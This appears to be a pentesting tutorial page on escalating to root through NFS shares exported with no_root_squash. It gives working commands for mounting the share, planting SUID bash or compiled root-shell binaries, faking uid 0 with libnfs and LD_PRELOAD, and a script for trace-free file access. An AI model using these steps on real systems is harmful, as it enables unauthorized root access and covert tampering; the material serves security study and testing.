  \n## Squashing Basic Info\n\nNFS will usually (specially in linux) trust the indicated `uid` and `gid` by the client conencting\
  \ to access the files (if kerberos is not used). However, there are some configurations that can be set in the server to\
  \ **change this behavior**:\n\n- **`all_squash`**: It squashes all accesses mapping every user and group to **`nobody`** (65534\
  \ unsigned / -2 signed). Therefore, everyone is `nobody` and no users are used.\n- **`root_squash`/`no_all_squash`**: This\
  \ is default on Linux and **only squashes access with uid 0 (root)**. Therefore, any `UID` and `GID` are trusted but `0`\
  \ is squashed to `nobody` (so no root imperonation is possible).\n- **``no_root_squash`**: This configuration if enabled\
  \ doesn't even squash the root user. This means that if you mount a directory with this configuration you can access it\
  \ as root.\n\nIn the **/etc/exports** file, if you find some directory that is configured as **no_root_squash**, then you\
  \ can **access** it from **as a client** and **write inside** that directory **as** if you were the local **root** of the\
  \ machine.\n\nFor more information about **NFS** check:\n\n\n{{#ref}}\n../../network-services-pentesting/nfs-service-pentesting.md\n\
  {{#endref}}\n\n## Privilege Escalation\n\n### Remote Exploit\n\nOption 1 using bash:\n- **Mounting that directory** in a\
  \ client machine, and **as root copying** inside the mounted folder the **/bin/bash** binary and giving it **SUID** rights,\
  \ and **executing from the victim** machine that bash binary.\n    - Note that to be root inside the NFS share, **`no_root_squash`**\
  \ must be configured in the server.\n    - However, if not enabled, you could escalate to other user by copying the binary\
  \ to the NFS share and giving it the SUID permission as the user you want to escalate to.\n\n```bash\n#Attacker, as root\
  \ user\nmkdir /tmp/pe\nmount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe\ncd /tmp/pe\ncp /bin/bash .\nchmod +s bash\n\n#Victim\n\
  cd <SHAREDD_FOLDER>\n./bash -p #ROOT shell\n```\n\nOption 2 using c compiled code:\n- **Mounting that directory** in a client\
  \ machine, and **as root copying** inside the mounted folder our come compiled payload that will abuse the SUID permission,\
  \ give to it **SUID** rights, and **execute from the victim** machine that binary (you can find here some[ C SUID payloads](payloads-to-execute.md#c)).\n\
  \    - Same restrictions as before\n\n```bash\n#Attacker, as root user\ngcc payload.c -o payload\nmkdir /tmp/pe\nmount -t\
  \ nfs <IP>:<SHARED_FOLDER> /tmp/pe\ncd /tmp/pe\ncp /tmp/payload .\nchmod +s payload\n\n#Victim\ncd <SHAREDD_FOLDER>\n./payload\
  \ #ROOT shell\n```\n\n### Local Exploit\n\n> [!TIP]\n> Note that if you can create a **tunnel from your machine to the victim\
  \ machine you can still use the Remote version to exploit this privilege escalation tunnelling the required ports**.\\\n\
  > The following trick is in case the file `/etc/exports` **indicates an IP**. In this case you **won't be able to use**\
  \ in any case the **remote exploit** and you will need to **abuse this trick**.\\\n> Another required requirement for the\
  \ exploit to work is that **the export inside `/etc/export`** **must be using the `insecure` flag**.\\\n> --_I'm not sure\
  \ that if `/etc/export` is indicating an IP address this trick will work_--\n\n### Basic Information\n\nThe scenario involves\
  \ exploiting a mounted NFS share on a local machine, leveraging a flaw in the NFSv3 specification which allows the client\
  \ to specify its uid/gid, potentially enabling unauthorized access. The exploitation involves using [libnfs](https://github.com/sahlberg/libnfs),\
  \ a library that allows for the forging of NFS RPC calls.\n\n#### Compiling the Library\n\nThe library compilation steps\
  \ might require adjustments based on the kernel version. In this specific case, the fallocate syscalls were commented out.\
  \ The compilation process involves the following commands:\n\n```bash\n./bootstrap\n./configure\nmake\ngcc -fPIC -shared\
  \ -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/\n```\n\n#### Conducting the Exploit\n\nThe exploit\
  \ involves creating a simple C program (`pwn.c`) that elevates privileges to root and then executing a shell. The program\
  \ is compiled, and the resulting binary (`a.out`) is placed on the share with suid root, using `ld_nfs.so` to fake the uid\
  \ in the RPC calls:\n\n1. **Compile the exploit code:**\n\n```bash\ncat pwn.c\nint main(void){setreuid(0,0); system(\"/bin/bash\"\
  ); return 0;}\ngcc pwn.c -o a.out\n```\n\n2. **Place the exploit on the share and modify its permissions by faking the uid:**\n\
  \n```bash\nLD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/\nLD_NFS_UID=0\
  \ LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out\nLD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/\
  \ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out\nLD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so\
  \ chmod u+s nfs://nfs-server/nfs_root/a.out\n```\n\n3. **Execute the exploit to gain root privileges:**\n\n```bash\n/mnt/share/a.out\n\
  #root\n```\n\n### Bonus: NFShell for Stealthy File Access\n\nOnce root access is obtained, to interact with the NFS share\
  \ without changing ownership (to avoid leaving traces), a Python script (nfsh.py) is used. This script adjusts the uid to\
  \ match that of the file being accessed, allowing for interaction with files on the share without permission issues:\n\n\
  ```python\n#!/usr/bin/env python\n# script from https://www.errno.fr/nfs_privesc.html\nimport sys\nimport os\n\ndef get_file_uid(filepath):\n\
  \    try:\n        uid = os.stat(filepath).st_uid\n    except OSError as e:\n        return get_file_uid(os.path.dirname(filepath))\n\
  \    return uid\n\nfilepath = sys.argv[-1]\nuid = get_file_uid(filepath)\nos.setreuid(uid, uid)\nos.system(' '.join(sys.argv[1:]))\n\
  ```\n\nRun like:\n\n```bash\n# ll ./mount/\ndrwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old\n```\n\n{{#include ../../banners/hacktricks-training.md}}"
